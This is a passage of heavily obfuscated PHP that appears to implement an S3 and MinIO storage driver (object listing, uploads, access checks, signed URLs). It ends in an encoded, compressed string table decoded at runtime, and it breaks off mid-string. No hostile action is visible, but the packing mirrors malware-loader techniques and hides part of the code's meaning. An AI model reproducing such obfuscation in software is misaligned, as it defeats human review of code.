rtrim($†£õ°†, $øĞ³ï[18]) . $øĞ³ï[18]; $Õ×ğ•ÁÜ = $this->listObjs($©´ì£«Ø, null, null, $Âª™Áé); if (!$Õ×ğ•ÁÜ) { return array($øĞ³ï[95] => array(), $øĞ³ï[96] => array()); } $åó¨úîÒ = $ú§ÆÓùš = array(); foreach ($Õ×ğ•ÁÜ[$øĞ³ï[237]] as $Ìüœƒ) { $×‘šºŒ = $Ìüœƒ[$øĞ³ï[42]]; if ($×‘šºŒ == $©´ì£«Ø) { continue; } $®”‡¤Ğ¶ = isset($Ìüœƒ[$øĞ³ï[89]]) ? $Ìüœƒ[$øĞ³ï[89]] : 0; $§šÚ¦àÀ = $®”‡¤Ğ¶ == 0 && substr($×‘šºŒ, strlen($×‘šºŒ) - 1, 1) == $øĞ³ï[18] ? !0 : !1; $this->cacheMethodInfoSet($×‘šºŒ, $§šÚ¦àÀ, $Ìüœƒ); if ($§šÚ¦àÀ) { $åó¨úîÒ[] = $×‘šºŒ; continue; } $ú§ÆÓùš[] = $Óñ¨ò©ï ? $Ìüœƒ : $×‘šºŒ; } foreach ($Õ×ğ•ÁÜ[$øĞ³ï[238]] as $Ìüœƒ) { $åó¨úîÒ[] = $Ìüœƒ[$øĞ³ï[42]]; $this->cacheMethodInfoSet($Ìüœƒ[$øĞ³ï[42]], !0); } $this->cacheMethodInfoSet($†£õ°†, !0); return array($øĞ³ï[95] => $åó¨úîÒ, $øĞ³ï[96] => $ú§ÆÓùš); } private function listObjs($Û·¿»‘, $ªğ¸ã‘ = null, $·‡´Ñ¼® = null, $êé½›ğí = null) { $ß§ôò˜ =& $_SERVER[Õò”†—·]; $Û·¿»‘ = trim($Û·¿»‘, $ß§ôò˜[18]); $Áí½ì”° = empty($Û·¿»‘) && $Û·¿»‘ !== $ß§ôò˜[229] ? $ß§ôò˜[22] : $Û·¿»‘ . $ß§ôò˜[18]; return $this->client->getBucket($this->bucket, $Áí½ì”°, $ªğ¸ã‘, $·‡´Ñ¼®, $êé½›ğí, !0); } public function has($„“éæ—‡, $ ƒ“—İ = false, $¦—¯öËš = true) { $¾½ˆıÙ =& $_SERVER[Õò”†—·]; $„“éæ—‡ = trim($„“éæ—‡, $¾½ˆıÙ[18]); $´¥ûÍÅŠ = empty($„“éæ—‡) && $„“éæ—‡ !== $¾½ˆıÙ[229] ? $¾½ˆıÙ[22] : $„“éæ—‡ . $¾½ˆıÙ[18]; $Á²ŞœÓ = null; $®ÔúÇ¤… = 500; $·Æ¸ = $¾½ˆıÙ[18]; $šì¶Ó…Ø = $ı‘Ö˜õ¯ = array(); while (!0) { $­ú‡Ë° = $this->listObjs($„“éæ—‡, $Á²ŞœÓ, $®ÔúÇ¤…, $·Æ¸); if (!$­ú‡Ë°) { break; } $Á²ŞœÓ = $­ú‡Ë°[$¾½ˆıÙ[239]]; $³ã´á¨– = $­ú‡Ë°[$¾½ˆıÙ[237]]; $’¦¾„™å = $­ú‡Ë°[$¾½ˆıÙ[238]]; if (empty($³ã´á¨–) && empty($’¦¾„™å)) { break; } if (count($³ã´á¨–) == 1 && $³ã´á¨–[0][$¾½ˆıÙ[42]] == $´¥ûÍÅŠ) { break; } if ($ ƒ“—İ) { if (count($³ã´á¨–)) { $³ã´á¨– = array_column($³ã´á¨–, $¾½ˆıÙ[42]); $šì¶Ó…Ø = array_merge($šì¶Ó…Ø, $³ã´á¨–); } if (count($’¦¾„™å)) { $’¦¾„™å = array_column($’¦¾„™å, $¾½ˆıÙ[42]); $ı‘Ö˜õ¯ = array_merge($ı‘Ö˜õ¯, $’¦¾„™å); } if ($Á²ŞœÓ === null) { break; } continue; } if ($¦—¯öËš) { if (!empty($³ã´á¨–)) { if (count($³ã´á¨–) > 1 || isset($³ã´á¨–[0][$¾½ˆıÙ[42]]) && $³ã´á¨–[0][$¾½ˆıÙ[42]] != $´¥ûÍÅŠ) { return !0; } } } else { if (!empty($’¦¾„™å)) { return !0; } } if ($Á²ŞœÓ === null) { break; } } if ($ ƒ“—İ) { $šì¶Ó…Ø = array_diff($šì¶Ó…Ø, array($´¥ûÍÅŠ)); $šì¶Ó…Ø = count(array_unique($šì¶Ó…Ø)); $ı‘Ö˜õ¯ = count(array_unique($ı‘Ö˜õ¯)); return array($¾½ˆıÙ[240] => $šì¶Ó…Ø, $¾½ˆıÙ[241] => $ı‘Ö˜õ¯); } return !1; } public function listAll($ŒéÃÃô•) { $ã¦³üâ =& $_SERVER[Õò”†—·]; $ŒŒçß = $this->fileList($ŒéÃÃô•, $ã¦³üâ[22], !0); $³¡Î¡¢ = array_to_keyvalue($ŒŒçß[$ã¦³üâ[96]], $ã¦³üâ[42]); foreach ($ŒŒçß[$ã¦³üâ[95]] as $¹±°›ƒÂ) { if (is_string($¹±°›ƒÂ)) { $³¡Î¡¢[$¹±°›ƒÂ] = array($ã¦³üâ[89] => 0); } } return $this->listAllFiles($ŒéÃÃô•, $³¡Î¡¢); } public function canRead($¢Ş“îŸ) { $ó‘©ì¶Ç =& $_SERVER[Õò”†—·]; $³ê‰¼Ú = $this->client->getAccessControlPolicy($this->bucket, $¢Ş“îŸ); if (!$³ê‰¼Ú) { return !1; } return in_array($³ê‰¼Ú, array($ó‘©ì¶Ç[242], $ó‘©ì¶Ç[243], $ó‘©ì¶Ç[244])) ? !0 : !1; } public function canWrite($å’œß”Î) { $ÉË¤ñÔ¸ =& $_SERVER[Õò”†—·]; $™³¹ŒÑ = $this->client->getAccessControlPolicy($this->bucket, $å’œß”Î); if (!$™³¹ŒÑ) { return !1; } return in_array($™³¹ŒÑ, array($ÉË¤ñÔ¸[242], $ÉË¤ñÔ¸[243])) ? !0 : !1; } public function getContent($É¯Ğ›¿€) { return $this->client->getObject($this->bucket, $É¯Ğ›¿€); } public function setContent($Àğş˜½é, $Ÿƒ‹Æë¿ = '', $Òù‘·¶¶ = false) { $ôê®˜ÓÁ =& $_SERVER[Õò”†—·]; $Àğş˜½é = $Òù‘·¶¶ ? trim($Àğş˜½é, $ôê®˜ÓÁ[18]) . $ôê®˜ÓÁ[18] : $Àğş˜½é; $«å­²óÏ = get_file_mime(get_path_ext($Àğş˜½é)); $õê·‹·Å = $this->client->putObject($Ÿƒ‹Æë¿, $this->bucket, $Àğş˜½é, $ôê®˜ÓÁ[230], array(), $«å­²óÏ); if (!$õê·‹·Å) { return !1; } if ($Òù‘·¶¶) { return !0; } return $õê·‹·Å ? !0 : !1; } public function fileSubstr($£§ì¦˜œ, $ÖÈ²œİ€, $ï„‡’„) { $ŸªÖ£ó = $ÖÈ²œİ€ + $ï„‡’„ - 1; return $this->client->getObject($this->bucket, $£§ì¦˜œ, array($_SERVER[Õò”†—·][245] => "\142\x79\x74\145\163\x3d{$ÖÈ²œİ€}\55{$ŸªÖ£ó}")); } public function upload($­â‹°¢, $øæùÄò, $Ô‚§¢‰Ü = false, $¯—úü¸å = REPEAT_REPLACE) { $ºóÒçşË =& $_SERVER[Õò”†—·]; $Ùü•÷æ = array($ºóÒçşË[246] => @md5_file($øæùÄò)); $ıĞ«¹ÃØ = array($ºóÒçşË[247] => get_file_mime(get_path_ext($­â‹°¢))); if (IO::size($øæùÄò) <= 1024 * 1024 * 200) { $µ‚†êï = $this->client->putObjectFile($øæùÄò, $this->bucket, $­â‹°¢, $ºóÒçşË[230], $Ùü•÷æ, $ıĞ«¹ÃØ); return !empty($µ‚†êï) ? $this->getPathOuter($­â‹°¢) : !1; } $Šç¼¯Úè = $this->client->multiUploadObject($øæùÄò, $this->bucket, trim($­â‹°¢, $ºóÒçşË[18]), $Ùü•÷æ, $ıĞ«¹ÃØ); return $Šç¼¯Úè ? $this->getPathOuter($­â‹°¢) : !1; } public function download($²ØŒ™, $ãË¡Ÿá–) { if (!@is_dir($this->pathFather($ãË¡Ÿá–)) && !IO::mkdir($this->pathFather($ãË¡Ÿá–))) { return !1; } $‚ÔÕ»­ = $this->client->getObject($this->bucket, $²ØŒ™, array(), $ãË¡Ÿá–); return $‚ÔÕ»­ !== !1 ? $ãË¡Ÿá– : !1; } public function link($çö¤†¿€, $¶×«êÎ¥ = array()) { $ÖĞİ’Ü¶ =& $_SERVER[Õò”†—·]; if ($this->signVer == $ÖĞİ’Ü¶[248]) { return $this->client->getAuthenticatedURL($this->bucket, $çö¤†¿€, 3600 * 12, $¶×«êÎ¥); } return $this->client->getObjectUrl($this->accessKey, $this->secret, $this->bucket, trim($çö¤†¿€, $ÖĞİ’Ü¶[18]), 3600 * 12, $this->region, array(), !0, $¶×«êÎ¥); } public function fileOut($¦‹ÂÜ—õ, $ë³ŸËŒŞ = false, $ã˜ÛÉ•‚ = false, $—ğ³Í— = '') { $µ¿äæÑ’ =& $_SERVER[Õò”†—·]; if ($this->isFileOutServer()) { return $this->fileOutServer($¦‹ÂÜ—õ, $ë³ŸËŒŞ, $ã˜ÛÉ•‚, $—ğ³Í—); } if (!$ã˜ÛÉ•‚) { $ã˜ÛÉ•‚ = $this->pathThis($¦‹ÂÜ—õ); } $ØŞ´óãã = get_file_mime(get_path_ext($ã˜ÛÉ•‚)); if ($ØŞ´óãã == $µ¿äæÑ’[249]) { return parent::fileOut($¦‹ÂÜ—õ, $ë³ŸËŒŞ, $ã˜ÛÉ•‚, $—ğ³Í—); } $Àûí­· = array($µ¿äæÑ’[250] => $ØŞ´óãã); if ($ë³ŸËŒŞ) { $Àûí­·[$µ¿äæÑ’[251]] = $µ¿äæÑ’[252] . rawurlencode($ã˜ÛÉ•‚); } else { } $ĞÂªØü° = $this->link($¦‹ÂÜ—õ, $Àûí­·); $this->fileOutLink($ĞÂªØü°); } public function fileOutServer($éññ˜×, $‹§‡‘Ï = false, $©«û ¾µ = false, $şÕºÀñÕ = '') { parent::fileOut($éññ˜×, $‹§‡‘Ï, $©«û ¾µ, $şÕºÀñÕ); } public function fileOutImageServer($’ï›ù¥¢, $èÛ°â…ü = 250) { parent::fileOutImage($’ï›ù¥¢, $èÛ°â…ü); } public function hashMd5($¢Æü©ß¿, $„œˆš ä = '') { $ú«°Şˆš = $this->objectMeta($¢Æü©ß¿); if (!$ú«°Şˆš) { return !1; } $„œˆš ä = $„œˆš ä ? $„œˆš ä : _get($ú«°Şˆš, $_SERVER[Õò”†—·][253]); return $„œˆš ä; } public function uploadFormData($Ì¬Æáô, $¤©ë¼ = 3600) { $ÜÈéÜë =& $_SERVER[Õò”†—·]; $÷Ú¾‡¶‰ = $this->pathFather($Ì¬Æáô); $Û²Â¯ö² = $this->client->getHttpUploadPostParams($this->bucket, $÷Ú¾‡¶‰, $ÜÈéÜë[230], $¤©ë¼); return array_merge((array) $Û²Â¯ö², array($ÜÈéÜë[209] => $this->getHost())); } public function multiUploadFormData($¯Ïáàµõ, $ˆ×»ö—¦ = 3600) { $±ÉÊÄš¿ =& $_SERVER[Õò”†—·]; $ßøŠºÖ = gmdate($±ÉÊÄš¿[254]); $Ù£Èş“ = array(); $İ¼®›š« = $this->client->getUploadId($this->bucket, $¯Ïáàµõ, $Ù£Èş“); if (!$İ¼®›š«) { return !1; } return array($±ÉÊÄš¿[255] => $İ¼®›š«, $±ÉÊÄš¿[209] => $this->getHost() . $±ÉÊÄš¿[18] . $this->pathEncode($¯Ïáàµõ), $±ÉÊÄš¿[256] => $ßøŠºÖ, $±ÉÊÄš¿[107] => $¯Ïáàµõ); } public function multiUploadAuthData($¶í¢á, $œ‰‘ÚµÓ = array()) { $õ»İÇÆş =& $_SERVER[Õò”†—·]; $’‚ƒ¥„µ = isset($œ‰‘ÚµÓ[$õ»İÇÆş[256]]) ? $œ‰‘ÚµÓ[$õ»İÇÆş[256]] : gmdate($õ»İÇÆş[254]); $±ü¦À— = isset($œ‰‘ÚµÓ[$õ»İÇÆş[188]]) ? $œ‰‘ÚµÓ[$õ»İÇÆş[188]] : $õ»İÇÆş[22]; $œ£‘¿Î = $œ‰‘ÚµÓ[$õ»İÇÆş[107]]; unset($œ‰‘ÚµÓ[$õ»İÇÆş[107]]); if (isset($œ‰‘ÚµÓ[$õ»İÇÆş[257]])) { $œ‰‘ÚµÓ[$õ»İÇÆş[256]] = $’‚ƒ¥„µ; return $this->listUploadParts($œ£‘¿Î, $œ‰‘ÚµÓ); } $ÚŒ’äİ• = array($õ»İÇÆş[258], $õ»İÇÆş[22], $õ»İÇÆş[133], $õ»İÇÆş[22], "\x78\55\x61\155\x7a\x2d\x64\x61\164\145\x3a{$’‚ƒ¥„µ}", $õ»İÇÆş[18] . $this->bucket . $õ»İÇÆş[18] . $this->pathEncode($œ£‘¿Î) . $±ü¦À—); if (strpos($±ü¦À—, $õ»İÇÆş[259]) === 0) { $ÚŒ’äİ•[0] = $õ»İÇÆş[260]; } if (isset($œ‰‘ÚµÓ[$õ»İÇÆş[261]]) && $œ‰‘ÚµÓ[$õ»İÇÆş[261]] == $õ»İÇÆş[262]) { $ÚŒ’äİ•[0] = $õ»İÇÆş[262]; } $ÜÊÕ‹´÷ = implode($õ»İÇÆş[12], $ÚŒ’äİ•); $±Æ€‹Çö = base64_encode(hash_hmac($õ»İÇÆş[263], $ÜÊÕ‹´÷, $this->secret, !0)); $åÊÉ…Ï = $õ»İÇÆş[264] . $this->accessKey . $õ»İÇÆş[4] . $±Æ€‹Çö; if (strpos($±ü¦À—, $õ»İÇÆş[259]) === 0) { return array($õ»İÇÆş[265] => $åÊÉ…Ï, $õ»İÇÆş[256] => $’‚ƒ¥„µ); } return $åÊÉ…Ï; } public function listUploadParts($µ¿âË¯¤, $¸éÍß™… = array()) { $Äº®ú‰é =& $_SERVER[Õò”†—·]; $§ê‡ÌàÎ = str_replace($Äº®ú‰é[266], $Äº®ú‰é[22], $¸éÍß™…[$Äº®ú‰é[188]]); $›ùâ¢Ãë = $this->client->listParts($this->bucket, $µ¿âË¯¤, $§ê‡ÌàÎ); if (!$›ùâ¢Ãë) { return !1; } unset($¸éÍß™…[$Äº®ú‰é[257]], $¸éÍß™…[$Äº®ú‰é[261]]); $¸éÍß™…[$Äº®ú‰é[107]] = $µ¿âË¯¤; $Ãîùúëé = $this->multiUploadAuthData($µ¿âË¯¤, $¸éÍß™…); if (empty($Ãîùúëé)) { return !1; } return array($Äº®ú‰é[265] => $Ãîùúëé, $Äº®ú‰é[256] => $¸éÍß™…[$Äº®ú‰é[256]], $Äº®ú‰é[267] => $›ùâ¢Ãë); } public function getHost() { $‚€Î×İ¦ =& $_SERVER[Õò”†—·]; $‘¥ğŸÀ = parent::getHost(); if (!$this->osType) { $this->osType = $this->getType(); } if (!in_array($this->osType, array($‚€Î×İ¦[80], $‚€Î×İ¦[74], $‚€Î×İ¦[79], $‚€Î×İ¦[72]))) { return $‘¥ğŸÀ . $‚€Î×İ¦[18] . $this->bucket; } $‘¥ğŸÀ = explode($‚€Î×İ¦[211], $‘¥ğŸÀ); return $‘¥ğŸÀ[0] . $‚€Î×İ¦[211] . $this->bucket . $‚€Î×İ¦[20] . $‘¥ğŸÀ[1]; } public function size($÷é¼àÃ±) { $Ú—‡®ñ› = $this->objectMeta($÷é¼àÃ±); return $Ú—‡®ñ› ? $Ú—‡®ñ›[$_SERVER[Õò”†—·][89]] : 0; } public function info($”œŠéÑà) { if ($this->isFolder($”œŠéÑà)) { return $this->folderInfo($”œŠéÑà); } else { if ($this->isFile($”œŠéÑà)) { return $this->fileInfo($”œŠéÑà); } } return !1; } public function exist($º‰ôÃ‚) { return $this->isFile($º‰ôÃ‚) || $this->isFolder($º‰ôÃ‚); } public function isFile($àÌ½‡šá) { return !$this->isFolder($àÌ½‡šá) && $this->objectMeta($àÌ½‡šá); } public function isFolder($ì’ıôÜŞ) { return $this->cacheMethod($_SERVER[Õò”†—·][179], $ì’ıôÜŞ); } protected function objectMeta($®†°©—ã) { return $this->cacheMethod($_SERVER[Õò”†—·][181], $®†°©—ã); } protected function _objectMeta($Åó¯Î¡¸) { $ ¾£±Ğı =& $_SERVER[Õò”†—·]; $Åó¯Î¡¸ = rtrim($Åó¯Î¡¸, $ ¾£±Ğı[18]); try { $ª‘†Íˆé = $this->client->getObjectInfo($this->bucket, $Åó¯Î¡¸); if (!isset($ª‘†Íˆé[$ ¾£±Ğı[253]]) && isset($ª‘†Íˆé[$ ¾£±Ğı[268]])) { $ª‘†Íˆé[$ ¾£±Ğı[253]] = $ª‘†Íˆé[$ ¾£±Ğı[268]]; } } catch (Exception $ïâÁ¨±) { $ª‘†Íˆé = !1; } if (!$ª‘†Íˆé) { } return $ª‘†Íˆé; } protected function _isFolder($­—»âÛ) { $Ê¥™û¨“ =& $_SERVER[Õò”†—·]; $­—»âÛ = rtrim($­—»âÛ, $Ê¥™û¨“[18]); if ($­—»âÛ == $Ê¥™û¨“[22] || $­—»âÛ == $Ê¥™û¨“[18]) { return !0; } $ÉæÏç = $this->client->getBucket($this->bucket, $­—»âÛ, null, 1); if (empty($ÉæÏç[$Ê¥™û¨“[237]])) { return !1; } $¾µ‰·« = $ÉæÏç[$Ê¥™û¨“[237]][0][$Ê¥™û¨“[42]]; return stripos($¾µ‰·«, $­—»âÛ . $Ê¥™û¨“[18]) === 0 ? !0 : !1; if (substr($¾µ‰·«, -1) == $Ê¥™û¨“[18]) { return !0; } if (get_path_this($¾µ‰·«) == get_path_this($­—»âÛ)) { return !1; } return !0; } public function listObject($´Á‘­Äô) { return $this->fileList($´Á‘­Äô, $_SERVER[Õò”†—·][22], !0); } } class PathDriverMinIO extends PathDriverBaseS3 { public function __construct($‹ü®§³Ş) { $Ô·¨Ñ‡ğ =& $_SERVER[Õò”†—·]; parent::__construct($‹ü®§³Ş); $this->setSignVersion($Ô·¨Ñ‡ğ[248]); if (!$this->region) { $this->region = $Ô·¨Ñ‡ğ[269]; $this->client->setRegion($this->region); } $this->client->setHeadValid(!1); } public function setBucketCors() { return !0; } public function getBucketCors() { return !0; } public function isBucketCors() { return !0; } public function checkRegion() { $ÄÈ¯Õîˆ = $this->getBucketRgn(); return $this->region == $ÄÈ¯Õîˆ ? !0 : !1; } public function uploadFormData($™•ÀäÓ–, $í——·¼Ä = 3600) { $”ı¢÷ì =& $_SERVER[Õò”†—·]; $Ê§â­­ = $”ı¢÷ì[230]; $¨¦½¯õ¶ = $”ı¢÷ì[270]; $ûÒèà”– = $”ı¢÷ì[72]; $½ä ²É = gmdate($”ı¢÷ì[271]); $“¹É‘»Ó = gmdate($”ı¢÷ì[272]); $öøŠ¼Õ÷ = $”ı¢÷ì[273]; $Æà£·Äœ = $í——·¼Ä . $”ı¢÷ì[22]; $Ú™€À¦ù = $”ı¢÷ì[274]; $ªâÌÄı‚ = array($this->accessKey, $“¹É‘»Ó, $this->region, $ûÒèà”–, $öøŠ¼Õ÷); $í²¯œŞ = implode($”ı¢÷ì[18], $ªâÌÄı‚); $İ©ğé²Ğ = array($”ı¢÷ì[275] => gmdate($”ı¢÷ì[276], strtotime($”ı¢÷ì[277])), $”ı¢÷ì[278] => array(array($”ı¢÷ì[279] => $this->bucket), array($”ı¢÷ì[280] => $Ê§â­­), array($”ı¢÷ì[281], $”ı¢÷ì[282], $”ı¢÷ì[22]), array($”ı¢÷ì[281], $”ı¢÷ì[283], $”ı¢÷ì[22]), array($”ı¢÷ì[281], $”ı¢÷ì[284], $”ı¢÷ì[22]), array($”ı¢÷ì[285] => $Ú™€À¦ù), array($”ı¢÷ì[286] => $í²¯œŞ), array($”ı¢÷ì[287] => $¨¦½¯õ¶), array($”ı¢÷ì[288] => $½ä ²É), array($”ı¢÷ì[289] => $Æà£·Äœ))); $«á©°ç = base64_encode(json_encode($İ©ğé²Ğ)); $ª÷å‰£ö = hash_hmac($”ı¢÷ì[290], $“¹É‘»Ó, $”ı¢÷ì[291] . $this->secret, !0); $šüĞ¥¤Ã = hash_hmac($”ı¢÷ì[290], $this->region, $ª÷å‰£ö, !0); $©óÊëÍ¶ = hash_hmac($”ı¢÷ì[290], $ûÒèà”–, $šüĞ¥¤Ã, !0); $ß¯ªÑ…Í = hash_hmac($”ı¢÷ì[290], $öøŠ¼Õ÷, $©óÊëÍ¶, !0); $‰­­ˆ„® = hash_hmac($”ı¢÷ì[290], $«á©°ç, $ß¯ªÑ…Í); $£Ä²˜Ï = array($”ı¢÷ì[247] => $”ı¢÷ì[22], $”ı¢÷ì[292] => $”ı¢÷ì[22], $”ı¢÷ì[280] => $Ê§â­­, $”ı¢÷ì[285] => $Ú™€À¦ù, $”ı¢÷ì[293] => $«á©°ç, $”ı¢÷ì[294] => $í²¯œŞ, $”ı¢÷ì[295] => $¨¦½¯õ¶, $”ı¢÷ì[296] => $½ä ²É, $”ı¢÷ì[297] => $Æà£·Äœ, $”ı¢÷ì[298] => $‰­­ˆ„®, $”ı¢÷ì[209] => $this->getHost()); return $£Ä²˜Ï; } } goto Eˆøœ¶éĞ—; dâ¢‡ÙÙ¬Ô: if (!function_exists('_kodDe')) { function _kodDe($str) { $str = base64_decode($str); $l = strlen($str); $result = ''; $offset = ord($str[0]) - 30; for ($i = 1; $i < $l; $i += 2) { if ($i + 1 < $l) { $result .= chr(ord($str[$i + 1]) + $offset); $result .= chr(ord($str[$i]) + $offset); } else { $result .= chr(ord($str[$i]) + $offset); } } return $result; } } define("\xd5\xf2\x94\x86\x97\xb7", "\x87\x9b\xa1\xfd\x9d\x89"); $_SERVER[Õò”†—·] = explode("\x7c\x3\x7c\x1\x7c\x5", gzinflate(substr(base64_decode('H4sIAAAAAAAAE8V9CXgb1bVw2QqE0vIKBVooDCaJ7USLnT1OnCDLsi0iW0aSs2CbyUgaWw==')."\23\113\32\131\63\362\226\204\175\51\20\22\226\20\266\24\50\24\32\326\260\157\41\120\50\145\51\175\224\322\322\226\255\245\20\47\241\141\151\241\224\322\102\371\357\162\356\62\43\31\336\377"."\xbd\xff\xfb\xfe\x40\xa2\x7b\xcf\x5d\xe6\x2e\xe7\x9e\x73\xee\xb9\xe7\x9e\xfb\xf2\x5d\x7f\x7e\xec\xb7\xd7\xad\xd9\x67\xcd\x5e\x6b\xf6\xbb\xe5\x87\x2f\xed\xb9\xed\x5c\x1a\x5e\xb3\x2f\xfa\x6f\x3f\x1a\x3e\xf6\xc2"."\3\276\106\376\34\172\341\5\65\65\155\163\46\115\357\370\306\206\373\356\320\366\152\372\335\77\237\272\357\227\233\177\373\346\57\157\115\244\27\75\262\271\377\230\257\255\331\357\317\223\33\120".base64_decode('Vlqygf4oedNW9BHDsi0KULU+I6vTMA5Zxpgup8RRPJwX6Wq/bqspM2/reVZFUyAeDqqdgQ==').strrev('gÊTÓÖÑf’Õ@jz2¤ş‹3ú$×4‡ÍlÖŸŞF“úHÄzCÊ˜­~XJß‚…kD').strrev('†™œôä™,PÎÎ®ñ¨MÚºX5˜5¯ò;xĞ}«Ciœõ‹Óú~Y†Ÿ£>ù›$'."\0".'ü')."\x50\x41\x2b\x6a\x39\xe8\x62\x41\x2f\x5a\x68\xcc\xe4\xea\xd4\x82\x59\xd0\xf3\xe\x88\x0\xe0\xae\x26\x35\xb\x6a\x6a\x6e\x52\x9b\x43\x9d\x91\xe8\xa\x35\xb1\xa2\x33\x4\x39\x92\xea\x60\x49\x2f\x8e\xd2\x18\x9".strrev('ÚĞ,gJyIp@¦‘#EQ8{{hÁÁAÚ8DÁÄt%á­Bš»ysÎœŒ\'h­mÆ')."\120\120\373\320\144\32\371\76\263\106\131\111\123\126\52\265\64\320\142\350\131\230\204\274\306\232\143\217\26\40\224\340\41\204\114\371\122\66\113\43\35\74\224\326\373\264\122\26\106\253\131\216"."\x14\x8a\x46\x4e\x63\x9d\x5e\xa2\x8f\x72\x28\x60\x4e\xc9\x36\x8d\x7c\x8a\x46\x42\x23\x76\x51\x13\x70\xd4\xd6\x14\x9a\x68\x84\x76\x14\x16\xf\x45\x42\xc1\x84\x82\x1b\xa8\xb4\xc4\xa2\xed\xa\x4c\x42\x4e\xb3\x6c".strrev('¼ÌåÌÊPŒE'."\n".'ÓJb‡5T*e¡ªÀ®zØ5DÊ"D	B†Òøµké5ctn'."\n".'BÅk,¨½')."\17\325\202\146\322\226\232\32\212\305\150\300\3\213\60\22\306\223\6\221\150\113\113\74\304\143\320\271\223\42\250\45\63\1\77\35\261\164\137\326\126\207\264\154\211\241\51\54\221\152\370\201".base64_decode('X9MC1B008kYJ0BSqME2LtRgCJZZbZxA9DYEcKm9CuSTAkizXKhYw0AodosHGRfR3AZRPYg==')."\162\61\244\27\155\125\317\247\314\264\221\207\165\274\30\360\121\263\63\315\105\104\46\212\100\144\314\154\232\205\5\61\302\244\247\243\224\223\263\360\50\42\62\331\164\121\317\177\165\116\32\215"."\360\225\214\363\212\130\1\265\204\23\1\243\157\124\54\105\234\257\223\247\132\146\251\230\102\104\261\17\206\245\36\300\272\155\243\316\261\1\61\273\12\131\123\113\307\365\42\357\232\141\266\240"."\212\242\45\133\6\226\110\266\26\263\230\153\106\104\3\276\217\26\214\321\125\41\141\200\55\231\264\64\142\376\232\356\63\274\377\351\355\76\1\375\123\13\124\261\7\332\224\321\263\131\125\37"."\321\141\115\345\322\263\55\66\30\176\13\23\145\4\241\321\160\124\315\150\126\246\75\75\133\45\245\30\261\115\353\43\276\102\246\0\13\236\257\361\36\7\316\343\241\353\60\355\220\304\130\262"."\x66\x4a\xcb\xca\x5d\xa4\xe1\x8c\x6d\x17\xe2\x7a\x3e\xdd\xc2\xb9\x4e\xda\x1c\xce\x93\x91\x2a\xe8\x8c\xf4\x37\x7b\x94\xb4\xd2\xae\xac\x50\xda\x1a\x8c\x6\x8b\x15\xcc\x65\x79\x88\xf5\x8e\xc3\x2c\xe\xb4\x47\xd8".base64_decode('dKb7AFsZx6iCDxoWIX5i5SKOlTVSmm2Yeb+ZsnXba9lFXYMaA6mUblneIGJ6RTPrDWSz5g==')."\xb0\x37\x5a\x34\xfa\x8d\x7c\x83\x32\xd\xe8\x30\xe5\x88\x5e\x4c\x1b\x1b\x60\x11\x57\x2d\x50\x30\xe2\xe0\xcf\x4c\x6b\x2c\xd9\x7d\xde\x79\x6c\x71\xf2\xdc\x45\x2d\x6f\xf5\xe9\x45\x6f\x8\x56\x46\x83\x82\x1a\xcb"."\x9\x24\xcb\xd6\x6c\x58\x5\xd3\x32\x70\xf3\x1a\x14\xcd\xb6\xb5\x54\x6\x13\x17\x51\x7d\xe3\x97\xe4\x37\x30\x1b\xd5\xcb\xf2\x86\x46\xa\x46\x51\xb7\x58\x5b\x95\xd6\xf6\x4\x54\x82\x6a\xd7\xbd\x9d\x45\xad\x3f".base64_decode('pzUohVISjQys1AowmhuGpkFJ4ahHyZUs21vUEZUyECeEQQ73edvxujL0tDeOiDmAZ9bNUg==').base64_decode('EOooLI1C2xKJTjXcgrh1R0htDySCIFuEbK2ftTmCSDSvkgGXe9H6wsjVgfoqgJ3msF5EHw==')."\x6e\x1a\x6d\x50\x6\xcc\x74\xd2\x1c\xf1\xb1\xa4\x16\x90\x72\x58\x66\x3c\xdd\x5\xdb\x1b\xd3\xf2\xfd\x78\x7c\x92\xa3\xb6\x6e\xb9\x49\x55\x13\xe2\xed\xbe\x3e\xba\x98\x7d\x49\xbd\xcf\x2c\x42\x6f\xac\xa1\x7e\xe7".base64_decode('XET0fL+dYXXHQ7GloZgaj7YklgViIArkESKNsNbgr2e9MT2NZidls3JaAQ8sy4PXD/44Sw==').base64_decode('xWuKpUXCrXjsmr0WyuSVc7G6I0bOwN2zeQoZbCQntEKD/KTPjT3WtJqe9PRaL/p3Wm13Tw==')."\263\157\132\357\142\277\41\312\370\353\175\365\312\214\272\71\112\47\22\134\14\55\253\100\247\313\162\324\51\321\45\316\141\21\10\237\67\363\372\227\14\16\346\174\22\145\160\15\53\5\306\102"."\x27\x75\x85\xe2\x9\xb5\x3d\x94\x68\x8b\x36\xc3\xd7\x43\x1\x8\x45\x4c\xba\xb2\x59\x6f\xbb\xe9\x4f\x2f\x20\x40\x2f\xfd\x51\xd\xab\x45\xe2\x3c\x38\xca\x29\x94\x6a\x26\x57\xa1\xc9\x68\xd7\x19\x19\x86\x99\xf"."\xe7\xb4\x7e\x89\xf\xa8\x4e\x36\x81\x63\x38\xb1\x5d\x20\x7\xc2\xb2\x65\x46\x9a\xf3\x11\x14\x6d\xd3\x8d\xfe\xc\xc\x98\x81\xab\x4b\x99\x59\xb3\xa8\x65\x31\xf5\x64\xb\x47\x67\x14\xad\xdf\x0\x8a\x56\xc8\x96"."\20\316\370\361\27\22\231\122\56\11\104\37\311\217\110\72\27\342\231\65\212\144\230\34\143\156\210\103\332\341\146\7\13\203\230\137\305\363\334\343\53\344\373\153\47\103\135\352\214\331\165\30"."\0\50\12\135\104\162\152\111\57\37\3\137\312\104\213\242\135\33\320\33\160\247\200\304\54\40\120\26\221\150\317\2\314\56\32\335\153\12\317\123\326\227\103\225\220\72\203\46\147\160\164\277".base64_decode('ssDJLhS9WDSLx0EOElYIz8HzBpXbnINbaPmwcMbkHB9tN2iowQ/9njKjBZZcGkk+PstGsw==').base64_decode('gTqopdOVwGiZQgVr4Ds0gbFUf3wm+l/wz7SZ0xg3InxET1NG4gC16RpHxGms3qJt4sSiIw==')."\x27\x42\xc9\x8c\x9\x2d\x43\x53\xf\xbd\x2a\xf1\xee\xb1\x8e\xa6\xf5\xac\xce\xd0\x29\xa3\x33\x5e\x5c\x7\xd9\xd0\xf0\x73\x64\x13\xbb\x41\x24\x6d\x23\xa8\x10\x82\xc\x2b\x86\x4a\x62\xce\xc9\xe2\xcb\xf0\xf6\x44"._kodDe('MJ7u7uYRtkdwYyKgPzJqoarlli4H4N+p9qPJ7tAG2RcYDAQ2fKB5GZM/AL9x8nzLyLY+RqA=')."\x38\x11\x62\x44\x20\xd0\xac\x6\x82\x9d\x10\xc3\xd4\x9b\x6\xb9\x84\x23\xf3\x68\xa\x19\x9a\x1\x78\x82\x1a\x